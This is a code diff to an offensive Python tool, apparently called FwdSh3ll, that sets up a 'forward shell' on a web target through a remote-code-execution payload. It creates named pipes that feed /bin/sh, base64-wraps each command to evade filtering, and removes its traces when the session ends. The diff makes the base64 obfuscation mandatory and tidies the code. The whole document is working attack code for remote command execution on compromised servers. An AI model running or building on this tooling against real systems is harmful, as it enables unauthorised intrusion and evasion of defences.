@@ -21,6 +21,7 @@ damage caused by this tool.
 @enddisclaimer
 """
 
+import urllib3
 import threading
 import random
 import string
@@ -43,19 +44,18 @@ OUTPUT = 'fwdshout'
 
 
 class ForwardShell:
-	def __init__(self, url, proxy, payloadName, genPayload, pipesPath, useBase64, interval=1.3):
+	def __init__(self, url, proxy, payloadName, genPayload, pipesPath, interval=1.3):
 		self._url = url
 		self._proxy = proxy
 		self._payloadName = payloadName
 		self._genPayload = genPayload
-		self._useBase64 = useBase64
 		self._interval = interval
 		self._delim = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
 
 		self._session = random.randrange(10000, 99999)
 		self._stdin = f'{pipesPath}/{INPUT}.{self._session}'
 		self._stdout = f'{pipesPath}/{OUTPUT}.{self._session}'
-		cprint(f'[*] Session ID: {self._session}', 'green')
+		cprint(f'[*] Session path & ID: {pipesPath}/{INPUT}.{self._session}', 'green')
 
 		cprint('[*] Setting up forward shell on target', 'green')
 		createNamedPipes = f'mkfifo {self._stdin}; tail -f {self._stdin} | /bin/sh >& {self._stdout}'
@@ -133,7 +133,7 @@ class ForwardShell:
 			except requests.exceptions.ReadTimeout:
 				return None
 
-			except requests.packages.urllib3.exceptions.ConnectTimeoutError:
+			except urllib3.exceptions.ConnectTimeoutError:
 				cprint('[!] Connection timeout error, retrying', 'yellow')
 				if firstConnect:
 					firstConnect = False
@@ -150,20 +150,14 @@ class ForwardShell:
 	def writeCmd(self, cmd, namedPipes=True):
 		if namedPipes:
 			cmd = f'echo {self._delim};' + cmd + f';echo {self._delim}\n'
-			if self._useBase64:
-				cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
-				cmd = f'echo {cmd} | base64 -d > {self._stdin}'
-			else:
-				cmd = f'echo {cmd} > {self._stdin}'
+			b64Cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
+			unwrapAndExec = f'echo {b64Cmd} | base64 -d > {self._stdin}'
 		else:
 			cmd = f'{cmd}\n'
-			if self._useBase64:
-				cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
-				cmd = f'echo {cmd} | base64 -d | /bin/sh > /dev/null'
-			else:
-				cmd = f'echo {cmd} | /bin/sh > /dev/null'
+			b64Cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
+			unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh &> /dev/null'
 
-		ForwardShell.runRawCmd(cmd, self._url, self._proxy, self._payloadName, self._genPayload)
+		ForwardShell.runRawCmd(unwrapAndExec, self._url, self._proxy, self._payloadName, self._genPayload)
 		sleep(self._interval * 1.2)
 
 	def upgradeToPty(self):
@@ -228,7 +222,7 @@ def main():
 		elif choice == '2':
 			cprint('\n############################## FORWARD SHELL MODE #############################\n', 'red')
 			prompt = colored('FwdSh3ll> ', 'magenta')
-			sh = ForwardShell(url, proxy, payloadName, payloadModule.genPayload, args.pipes_path, args.no_base64)
+			sh = ForwardShell(url, proxy, payloadName, payloadModule.genPayload, args.pipes_path)
 			print()
 
 			try:
@@ -245,8 +239,10 @@ def main():
 			except KeyboardInterrupt:
 				cprint('\n\n[*] Terminating shell, cleaning up the mess\n', 'green')
 				del sh
-				b64Cmd = b64encode(f'rm -f {args.pipes_path}/{INPUT}.* {args.pipes_path}/{OUTPUT}.*\n'.encode('utf-8')).decode('utf-8')
-				ForwardShell.runRawCmd(f'echo {b64Cmd} | base64 -d | /bin/sh > /dev/null', url, proxy, payloadName, payloadModule.genPayload)
+				cmd = f'rm -f {args.pipes_path}/{INPUT}.* {args.pipes_path}/{OUTPUT}.*\n'
+				b64Cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
+				unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh &> /dev/null'
+				ForwardShell.runRawCmd(unwrapAndExec, url, proxy, payloadName, payloadModule.genPayload)
 				break
 
 
